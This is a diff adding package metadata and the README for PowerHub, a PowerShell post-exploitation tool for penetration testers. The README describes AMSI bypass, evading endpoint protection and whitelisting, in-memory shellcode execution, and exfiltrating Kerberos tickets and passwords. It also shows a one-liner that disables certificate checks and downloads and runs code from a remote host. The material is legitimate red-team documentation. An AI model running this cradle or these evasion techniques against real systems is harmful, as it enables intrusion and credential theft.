@@ -1,0 +1,128 @@
+Metadata-Version: 2.4
+Name: powerhub
+Version: 2.0.11
+Summary: A post exploitation tool based on a web application, focusing on bypassing endpoint protection and application whitelisting
+Author-email: Adrian Vollmer <computerfluesterer@protonmail.com>
+License: MIT License
+Project-URL: Homepage, https://github.com/AdrianVollmer/PowerHub
+Project-URL: Bug Tracker, https://github.com/AdrianVollmer/PowerHub/issues
+Keywords: pentest,c2,powershell,obfuscation,post-exploitation
+Classifier: Operating System :: POSIX :: Linux
+Classifier: Programming Language :: Python
+Classifier: Programming Language :: Python :: 3
+Classifier: Programming Language :: Python :: 3.7
+Classifier: Programming Language :: Python :: 3.8
+Classifier: Programming Language :: Python :: 3.9
+Classifier: Programming Language :: Python :: 3.10
+Requires-Python: >=3.7
+Description-Content-Type: text/markdown
+Requires-Dist: cheroot
+Requires-Dist: cryptography>=42
+Requires-Dist: dnspython>=2.3
+Requires-Dist: Flask>=1.0.2
+Requires-Dist: Flask-SocketIO>=5.3.0
+Requires-Dist: flask-sqlalchemy>=3.0
+Requires-Dist: importlib-metadata; python_version < "3.8"
+Requires-Dist: Jinja2>=3.0
+Requires-Dist: pyOpenSSL
+Requires-Dist: python-magic
+Requires-Dist: requests
+Requires-Dist: service_identity
+Requires-Dist: simple-websocket
+Requires-Dist: sqlalchemy>=2.0
+Requires-Dist: python-socketio>=5.8
+Requires-Dist: twisted>=18.9.0
+Requires-Dist: watchdog
+Requires-Dist: werkzeug>=0.15
+Requires-Dist: wsgidav>=3.0.0
+Provides-Extra: tests
+Requires-Dist: pytest; extra == "tests"
+Requires-Dist: flake8; extra == "tests"
+Requires-Dist: beautifulsoup4; extra == "tests"
+Requires-Dist: lxml; extra == "tests"
+Provides-Extra: dev
+Requires-Dist: tox; extra == "dev"
+
+PowerHub
+========
+
+PowerHub is a convenient post exploitation tool for PowerShell which aids a
+pentester in transferring data, in particular code which may get flagged by
+endpoint protection. Features:
+
+* Fileless
+* Stateless
+* Cert pinning
+* String "obfuscation" by RC4 encryption
+* Choose your AMSI Bypass
+* Transparent aliases for in-memory execution of C# programs
+
+![PowerHub Webapp](docs/img/powerhub-webapp.png)
+![PowerHub Webapp](docs/img/powerhub-sharphound.png)
+
+During an engagement where you have a test client available, one of the
+first things you want to do is run SharpHound, Seatbelt, PowerUp,
+Invoke-PrivescCheck or PowerSploit. So you need to download the files,
+mess with endpoint protection, disable the execution policy, etc.
+PowerHub provides an (almost) one-click-solution for this. Oh, and you can
+also run arbitrary binaries (PE and shell code) entirely in-memory using
+PowerSploit's modules, which is sometimes useful to bypass application
+whitelisting.
+
+Your loot (Kerberos tickets, passwords, etc.) can be easily transferred back
+either as a file or a text snippet, via the command line or the web
+interface. PowerHub also helps with collaboration in case you're a small
+team.
+
+Here is a simple example (grab information about local groups with PowerView
+and transfer it back):
+
+```ps1con
+PS C:\Users\avollmer> [System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};$Nxois='bZeVBC4vZfakT5SmCcaFam6IRY6UNLnC';$Plukgmio=New-Object Net.WebClient;IEX $Plukgmio.DownloadString('https://192.168.11.2:8443/')
+  _____   _____  _  _  _ _______  ______ _     _ _     _ ______
+ |_____] |     | |  |  | |______ |_____/ |_____| |     | |_____]
+ |       |_____| |__|__| |______ |    \_ |     | |_____| |_____]
+2.0.0                       written by Adrian Vollmer, 2018-2024
+Run 'Help-PowerHub' for help
+PS C:\Users\avollmer> Get-HubModule PowerView
+
+Name   : /home/avollmer/.local/share/powerhub/modules/PowerSploit/Recon/PowerView.ps1
+Type   : ps1
+N      : 205
+Loaded : True
+Alias  :
+
+PS C:\Users\avollmer> Get-LocalGroup | PushTo-Hub -Name groups.json
+```
+
+Documentation
+=============
+
+Read the docs [here](https://adrianvollmer.github.io/PowerHub/).
+
+* **Installation:** <https://adrianvollmer.github.io/PowerHub/latest/installation.html>
+* **Usage:** <https://adrianvollmer.github.io/PowerHub/latest/usage.html>
+* **Contributing:** <https://adrianvollmer.github.io/PowerHub/latest/contrib.html>
+* **Changelog:** <https://adrianvollmer.github.io/PowerHub/latest/changelog.html>
+
+
+Credits
+=======
+
+PowerHub is partially based on the awesome work of zc00l, @am0nsec, mar10,
+p3nt4. And of course, it would be nothing without @harmj0y,
+@mattifestation and the many other contributors to
+[PowerSploit](https://github.com/PowerShellMafia/PowerSploit).
+
+Thanks!
+
+Author and License
+==================
+
+Adrian Vollmer, 2018-2024. MIT License.
+
+Disclaimer
+==========
+
+Use at your own risk. Do not use without full consent of everyone involved.
+For educational purposes only.
